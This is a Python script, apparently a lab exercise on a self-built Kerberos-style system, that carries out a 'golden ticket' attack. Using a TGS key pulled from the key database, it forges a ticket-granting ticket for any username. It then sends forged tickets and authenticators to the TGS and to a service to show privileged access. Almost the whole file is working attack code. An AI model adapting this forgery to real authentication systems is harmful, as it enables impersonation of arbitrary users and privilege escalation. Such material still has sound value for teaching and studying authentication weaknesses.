from database import db,keys_collection

import sys
import socket
import time
import pysodium
from security import symmetric_encrypt,symmetric_decrypt
import hashlib
import struct
from database import db, users_collection,keys_collection
from fontTools.misc.filenames import userNameToFileName
from security import symmetric_decrypt, symmetric_encrypt

# 规定标准的长度
MAX_ID_BYTES = 64
KEY_LEN = 32
TS_LEN = 8
NONCE_LEN = 24
MAC_LEN=16

def create_server(port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    sock.bind(('0.0.0.0', port))
    sock.listen(1)
    return sock


def connect_socket(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    try:
        sock.connect((ip, port))
    except Exception as e:
        print(f"连接失败: {e}")
        exit(1)
    return sock

#敌手拿到了AS和TGS共享的密钥KRBTGT之后，就可以在不需要任意用户除用户名外的信息情况下，跳过AS服务器伪造票据，获得任意大的权限
def golden_ticket():
    if len(sys.argv) != 6:
        print("用法: python脚本名 <username> <TGS_IP> <TGS_PORT> <V_IP> <V_PORT>")
        exit(1)

    username = sys.argv[1]

    id_tgs="TGS"

    #敌手自己选择用户，生成一个黄金票据
    K_c_tgs=pysodium.randombytes(pysodium.crypto_secretbox_KEYBYTES)
    ts_2=time.time()
    ls_2=3600 #票据有效期设置为一个小时
    username_encoded=username.encode()[:MAX_ID_BYTES].ljust(MAX_ID_BYTES,b'\0')
    ts_2_encoded=struct.pack('>d',ts_2)
    ls_2_encoded=struct.pack('>d',ls_2)
    id_tgs_encoded=id_tgs.encode()[:MAX_ID_BYTES].ljust(MAX_ID_BYTES,b'\0')

    key=keys_collection.find_one({'key_name':'tgs_as'})
    k_tgs=key.get('key')
    if not k_tgs:
        print("密钥不存在")
        exit(1)

    ticket=K_c_tgs+username_encoded+id_tgs_encoded+ts_2_encoded+ls_2_encoded
    nonce_as_tgs,Ticket_tgs=symmetric_encrypt(ticket,k_tgs)
    Ticket_tgs+=nonce_as_tgs

    #敌手生成其余需要给TGS的信息
    id_v = "V"
    id_v_encoded = id_v.encode()[:MAX_ID_BYTES].ljust(MAX_ID_BYTES, b'\0')
    ts_3 = time.time()
    ts_3_encoded = struct.pack('>d', ts_3)
    auth_data = username_encoded + ts_3_encoded
    nonce_tgs, auth_encrypted = symmetric_encrypt(auth_data, K_c_tgs)
    Authenticator_1 = auth_encrypted + nonce_tgs

    #之后的逻辑和普通的客户与TGS和V的交互逻辑类似
    ip_tgs=sys.argv[2]
    port_tgs=int(sys.argv[3])
    sock_tgs=connect_socket(ip_tgs,port_tgs)
    sock_tgs.sendall(id_v_encoded+Ticket_tgs+Authenticator_1)

    data = b''
    expected_len = 2 * KEY_LEN + 3 * MAX_ID_BYTES + 3 * TS_LEN + 2 * NONCE_LEN+2*MAC_LEN
    while len(data) < expected_len:
        data += sock_tgs.recv(4096)
    print("接受响应")
    cipher_tgs = data[:-NONCE_LEN]
    nonce_tgs_resp = data[-NONCE_LEN:]

    decrypted_tgs = symmetric_decrypt(nonce_tgs_resp, cipher_tgs, K_c_tgs)
    if not decrypted_tgs:
        print("TGS解密失败")
        exit(1)

    # 解析TGS响应
    K_c_v = decrypted_tgs[:KEY_LEN]
    id_v_received = decrypted_tgs[KEY_LEN:KEY_LEN + MAX_ID_BYTES].rstrip(b'\0')
    if id_v_received != id_v.encode():
        print("TGS返回的服务ID不匹配")
        exit(1)

    Ticket_v = decrypted_tgs[KEY_LEN + MAX_ID_BYTES + TS_LEN:]
    sock_tgs.close()

    # 连接服务V
    ip_v = sys.argv[4]
    port_v = int(sys.argv[5])
    sock_v = connect_socket(ip_v, port_v)

    ts_5 = time.time()
    ts_5_encoded = struct.pack('>d', ts_5)

    # 构造最终认证器
    auth_data_v = username_encoded + ts_5_encoded
    nonce_v, auth_encrypted_v = symmetric_encrypt(auth_data_v, K_c_v)
    Authenticator_2 = auth_encrypted_v + nonce_v
    print(len(Ticket_v))
    print(len(Authenticator_2))

    sock_v.sendall(Ticket_v + Authenticator_2)

    data = b''
    while len(data) < TS_LEN:
        data += sock_v.recv(4096)

    try:
        ts_response = struct.unpack('>d', data)[0]
        if abs(ts_response - (ts_5 + 1)) > 1:
            print("票据服务器认证失败")
            exit(1)
    except struct.error:
        print("无效的时间戳响应")
        exit(1)

    print("黄金票据认证成功")
    sock_v.close()

if __name__ == "__main__":
    golden_ticket()
